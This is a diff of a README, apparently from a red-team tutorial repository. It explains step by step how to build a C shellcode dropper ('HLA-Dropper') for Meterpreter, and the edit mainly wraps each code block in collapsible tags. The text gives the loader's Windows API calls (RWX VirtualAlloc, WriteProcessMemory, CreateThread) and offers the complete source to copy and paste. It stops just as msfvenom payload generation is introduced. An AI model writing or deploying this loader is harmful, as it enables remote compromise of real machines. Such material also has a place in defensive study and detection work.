@@ -40,6 +40,7 @@ The technical functionality of the HLA-Dropper is relatively simple and therefor
 - WaitForSingleObject
 
 The code works like this. First, we need to define the thread function for shellcode execution later in the code.
+<details>
 ```
 // Define the thread function for executing shellcode
 // This function will be executed in a separate thread created later in the main function
@@ -54,45 +55,60 @@ DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
     return 0;
 }
 ```
-
+</details>
+  
+  
 Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
+<details>
 ```
 // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
     unsigned char code[] = "\xfc\x48\x83";
 ```
+</details> 
+
     
 The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
+<details>
 ```
 // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
     // 'exec' will hold the base address of the allocated memory region
     void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
+</details>    
+    
 
-The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.<p align="center">
+The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
+<details>
 ```
 // Copy the shellcode into the allocated memory region using WriteProcessMemory
     SIZE_T bytesWritten;
     WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
 ```
+</details>
+    
 
 Next, the Windows API **CreateThread** is used to execute the meterpreter shellcode. This is done by creating a new thread.<p align="center">
+<details>
 ```
 // Create a new thread to execute the shellcode
     // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
     // The returned handle of the created thread is stored in hThread
     HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 
 ```
+</details>
 
 And by using the Windows API **WaitForSingleObject** we need to make sure that the shellcode thread completes its execution before the main thread exits.
+<details>    
 ```
 // Wait for the shellcode execution thread to finish executing
     // This ensures the main thread doesn't exit before the shellcode has finished running
     WaitForSingleObject(hThread, INFINITE);    
 ```
+</details>    
 
 Here is the **complete code**, and you can copy and paste this code into your **HLA-Dropper** project in Visual Studio.
 You can also download the complete **HLA-Dropper Visual Studio projec**t in the **Code Example section** of this repository.
-
+<details>
 ```
 #include <stdio.h>
 #include <windows.h>
@@ -135,7 +151,7 @@ int main() {
     return 0;
 }
 ```
-
+</details>
 
 ## Meterpreter Shellcode
 In this step, we will create our meterpreter shellcode for the HLA dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
